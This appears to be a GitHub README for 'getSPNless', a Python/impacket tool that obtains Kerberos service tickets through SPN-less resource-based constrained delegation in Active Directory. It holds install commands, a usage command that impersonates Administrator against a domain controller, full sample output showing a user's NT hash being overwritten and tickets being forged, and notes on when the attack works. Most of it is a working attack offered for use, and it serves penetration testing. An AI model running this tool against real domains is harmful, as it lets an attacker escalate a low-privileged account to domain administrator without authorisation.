# getSPNless
![Example](https://github.com/jarnovandenbrink/getSPNless/blob/main/assets/example.png)

Python tool to obtain Kerberos service tickets using the SPN-less technique. Based on [Exploiting RBCD Using a Normal User Account](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html).

This tool uses the [impacket](https://github.com/SecureAuthCorp/impacket) project.

### Installation
These tools are only compatible with Python 3.5+. Clone the repository from GitHub, install the dependencies and you should be good to go:

```bash 
git clone https://github.com/jarnovandenbrink/getSPNless.git
cd getSPNless
python3 -m pip install .
```
Using a virtualenv is recommended.

### Usage

```bash 
python3 getSPNless.py -spn cifs/DC01.pwn.local -dc-ip 192.168.2.64 -impersonate Administrator pwn.local/low:'Somepass1' 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting a TGT
[*] Calculating RC4 value of the provided password
[*] NT Hash: :3ac433014b4d5b1b4bc8a5350153ea93
[*] Saving ticket in low.ccache
[*] Ticket Session Key: 37ff4701394ef659bdd724e5dca5c00f
[*] Changing the password of pwn.local\low
[*] Connecting to DCE/RPC as pwn.local\low
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.pwn.local@PWN.LOCAL.ccache

[*] To revert the password, run: changepasswd.py pwn.local/low:Somepass1@192.168.2.64 -hashes :37ff4701394ef659bdd724e5dca5c00f -newpass Somepass1                                                                                          
```
Alternatively, an NT hash can be used. Note that when using an NT hash, password recovery is only possible if the “password never expires" flag is set on the user account.

### Exploitation
This tool provides a method to bypass the machine account requirement when performing RBCD attacks. The current issue when performing RBCD with a user account is that the KDC does not know which encryption key to use for the ticket. This tool works around this limitation by requesting a Kerberos TGT, extracting the ticket session key, and modifying the user’s NT hash. Using S4U2Self+U2U and S4U2Proxy, it is still possible to obtain a service ticket. I would personally opt to use machine accounts, or shadow credentials with PKINIT/UnPAC-the-Hash over SPN-less RBCD. However this is a good alternative when MachineAccountQuota is set to 0 and there is no ADCS available or PKINIT is disabled. Note that the attack will not work if the RC4 Kerberos Encryption Type is disabled. You can check this by checking for Kerberos type 23 (Etype 23).

### Acknowledgements
This project was developed partly during my work at [Cyber Cloud](https://cybercloud.cc) and partly in my own time. Thanks to Cyber Cloud for providing the time to develop and research this work.